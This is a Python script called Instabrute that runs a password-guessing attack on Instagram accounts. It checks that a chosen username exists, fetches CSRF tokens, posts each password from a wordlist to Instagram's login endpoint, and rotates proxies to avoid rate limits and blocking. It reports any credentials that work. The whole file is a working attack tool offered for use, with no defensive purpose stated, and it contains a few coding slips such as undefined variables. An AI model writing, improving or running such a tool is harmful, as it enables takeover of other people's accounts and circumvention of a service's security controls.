import requests
import json
import time
import os
import random

import sys

def Input(text):
	value = ''
	if sys.version_info.major > 2:
		value = input(text)
	else:
		value = raw_input(text)
	return str(value)





class Instabrute():
	def __init__(self, username, passwordsFile='pass.txt'):
		self.username = username
		self.CurrentProxy = ''
		self.UsedProxys = []
		self.passwordsFile = passwordsFile
		
		#Check if passwords file exists
		self.loadPasswords()
		#Check if username exists
		self.IsUserExists()


	def loadPasswords(self):
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				self.passwords = f.read().splitlines()
				passwordsNumber = len(self.passwords)
				if (passwordsNumber > 0):
					print ('[*] %s Passwords loads successfully' % passwordsNumber)
				else:
					print('Password file are empty, Please add passwords to it.')
					Input('[*] Press enter to exit')
					exit()
		else:
			print ('Please create passwords file named "%s"' % self.passwordsFile)
			Input('[*] Press enter to exit')
			exit()

	
	def randomProxy(self):
		plist = open('proxy.txt').read().splitlines()
		proxy = random.choice(plist)

		if not proxy in proxyUsed:
			self.CurrentProxy = proxy
			self.UsedProxys.append(proxy)
		print ('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy }).text)


	def IsUserExists(self):
		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
		if (r.status_code == 404):
			print ('[*] User named "%s" not found' % username)
			Input('[*] Press enter to exit')
			exit()
		elif (r.status_code == 200):
			return True


	def Login(self, password):
		sess = requests.Session()

		sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }

		#build requests headers
		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
		sess.headers.update({
			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
			'x-instagram-ajax':'1',
			'X-Requested-With': 'XMLHttpRequest',
			'origin': 'https://www.instagram.com',
			'ContentType' : 'application/x-www-form-urlencoded',
			'Connection': 'keep-alive',
			'Accept': '*/*',
			'Referer': 'https://www.instagram.com',
			'authority': 'www.instagram.com',
			'Host' : 'www.instagram.com',
			'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
			'Accept-Encoding' : 'gzip, deflate'
		})

		#Update token after enter to the site
		r = sess.get('https://www.instagram.com/') 
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

		#Update token after login to the site 
		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
		
		#parse response
		data = json.loads(r.text)
		if (data['status'] == 'fail'):
			print (data['message'])
			randomProxy()
			return False

		#return session if password is correct 
		if (data['authenticated'] == True):
			return sess 
		else:
			return False


			



###Start###


username = Input('Please enter a username: ')
instabrute = Instabrute(username)

delayLoop = int(Input('Please add delay between the bruteforce action (in seconds): ')) 

UsePorxy = Input('Do you want to use proxy (y/n): ').upper()
if (UsePorxy == 'Y' or UsePorxy == 'YES'):
	instabrute.randomProxy()


for password in instabrute.passwords:
	sess = instabrute.Login(password)
	if sess:
		print ('Login success %s' % [username,password])
	else:
		print ('[*] Password incorrect [%s]' % password)

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		WantToExit = str(Input('Type y/n to exit: ')).upper()
		if (WantToExit == 'Y' or WantToExit == 'YES'):
			exit()
		else:
			continue
		

